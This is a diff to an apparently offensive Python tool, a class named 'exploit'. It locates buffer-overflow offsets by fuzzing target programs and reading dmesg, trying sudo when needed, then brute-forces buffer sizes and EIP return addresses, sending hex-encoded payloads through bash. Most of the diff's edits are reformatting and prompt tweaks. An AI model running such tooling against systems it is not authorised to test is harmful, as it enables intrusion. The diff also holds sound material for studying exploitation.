@@ -176,12 +176,13 @@ class exploit:
                         init_dmesg = check_dmesg()
                         if self.stdin_or_arg == "stdin":
                             p1 = subprocess.Popen([self.target_exe], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-                                                stderr=subprocess.STDOUT, shell=True, universal_newlines=True)
+                                                  stderr=subprocess.STDOUT, shell=True, universal_newlines=True)
                             p1.communicate(input=pattern)
                         elif self.stdin_or_arg == "arg":
                             p1 = subprocess.Popen(["/bin/bash"], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-                                                stderr=subprocess.STDOUT, shell=True, universal_newlines=True)
-                            p1.communicate(input=(" ".join([self.target_exe, pattern])))
+                                                  stderr=subprocess.STDOUT, shell=True, universal_newlines=True)
+                            p1.communicate(
+                                input=(" ".join([self.target_exe, pattern])))
                         else:
                             print("\nMissing information\n")
                         new_dmesg = check_dmesg()
@@ -377,7 +378,7 @@ class exploit:
                     "of your target", already_exists=True)
             if self.stdin_or_arg == None:
                 response = get_input(
-                    "#|| Does your target accept the payload through stdin or cmdline argument? " +
+                    "\n#|| Does your target accept the payload through stdin or cmdline argument? " +
                     "([s]/c):\n", ["s", "c", ""], default="s")
                 if response == "s":
                     # Stdin
@@ -500,13 +501,13 @@ class exploit:
             return
 
         buffer_interval = int(get_input("\nEnter a confidence interval for your buffer size: " +
-                                        "([1]-1000)\n" +
+                                        "(0-1000) [1]\n" +
                                         "For interval = n, I will conduct an attempt for every buffer size in range " +
                                         "(nominal - n, nominal + n)\n",
                                         [str(i) for i in range(1001)], default="0"))
 
         eip_interval = int(get_input("\nEnter a confidence interval for your target EIP: " +
-                                     "([1]-1000)\n" +
+                                     "(0-1000) [1]\n" +
                                      "For interval = n, I will conduct an attempt for every EIP in range " +
                                      "(nominal - (1 byte)*n, nominal + (1 byte)*n)\n" +
                                      "For interval = n, I will conduct 2*(n+1) attempts\n",
@@ -528,27 +529,35 @@ class exploit:
                         if self.is_local:
                             if self.stdin_or_arg == "stdin":
                                 p = subprocess.Popen([cmd_string], stdin=subprocess.PIPE,
-                                                     stdout=subprocess.PIPE, 
+                                                     stdout=subprocess.PIPE,
                                                      stderr=subprocess.STDOUT, shell=True)
                                 out = p.communicate(input=self.payload)[
                                     0].decode()
-                                responses.append(list(filter(lambda a: a != "", out.split("\n")))[-1])
+                                responses.append(
+                                    list(filter(lambda a: a != "", out.split("\n")))[-1])
                                 print("\t[*] Sent!")
                             elif self.stdin_or_arg == "arg" and self.local_os == "linux":
-                                string = binascii.hexlify(self.payload).decode()
-                                lit_string = r"\x".join([string[i:i+2] for i in range(0,len(string),2)])
+                                string = binascii.hexlify(
+                                    self.payload).decode()
+                                lit_string = r"\x".join(
+                                    [string[i:i+2] for i in range(0, len(string), 2)])
                                 lit_string = r"$'\x" + lit_string + r"'"
                                 if self.trigger_arg == None or self.trigger_arg == "NA":
                                     cmd = " ".join([cmd_string, lit_string])
                                 else:
-                                    cmd = " ".join([cmd_string, self.trigger_arg, lit_string])
+                                    cmd = " ".join(
+                                        [cmd_string, self.trigger_arg, lit_string])
                                 p = subprocess.Popen(["/bin/bash"], stdin=subprocess.PIPE,
-                                                     stdout=subprocess.PIPE, 
-                                                     stderr=subprocess.STDOUT, universal_newlines=True)
-                                out = p.communicate(input=cmd)[0]
-                                # Split on newline, filter null entries, append the last remaining line
-                                responses.append(list(filter(lambda a: a != "", out.split("\n")))[-1])
-                                print("\t[*] Sent!")
+                                                     stdout=subprocess.PIPE,
+                                                     stderr=subprocess.STDOUT)
+                                cmd = bytearray(cmd, "utf-8")
+                                try:
+                                    out = p.communicate(input=cmd)[0]
+                                    responses.append(out)
+                                    print("\t[*] Sent!")
+                                except Exception as e:
+                                    print("\t[*] Error -- Don't worry, this is normal\n" +
+                                          f"\tError: {e}")
                             else:
                                 print(missing)
                         else:
@@ -587,11 +596,12 @@ def check_dmesg():
     Get dmesg output on linux
     """
     dmesg = subprocess.check_output("dmesg | tail", stderr=subprocess.STDOUT,
-                                    shell=True, universal_newlines=True).split("\n")
+                                    shell=True, universal_newlines=True)
     if "not permit" in dmesg:
         print("[*] Need sudo for dmesg. Trying now...")
         dmesg = subprocess.check_output("sudo dmesg | tail", stderr=subprocess.STDOUT,
-                                        shell=True, universal_newlines=True).split("\n")
+                                        shell=True, universal_newlines=True)
+    dmesg = dmesg.split("\n")
     # print(dmesg)    # Debug
     # Remove any lines without at least three consecutive non-whitespace characters
     for line in dmesg:
@@ -791,7 +801,7 @@ def check_input():
     """
     Asks user to verify their own input
     """
-    return yn_key[get_input("#|| Does your input look correct? ([y]/n):\n", ["y", "n", ""], default="y")]
+    return yn_key[get_input("\n#|| Does your input look correct? ([y]/n):\n", ["y", "n", ""], default="y")]
 
 
 def get_intended_type(string):
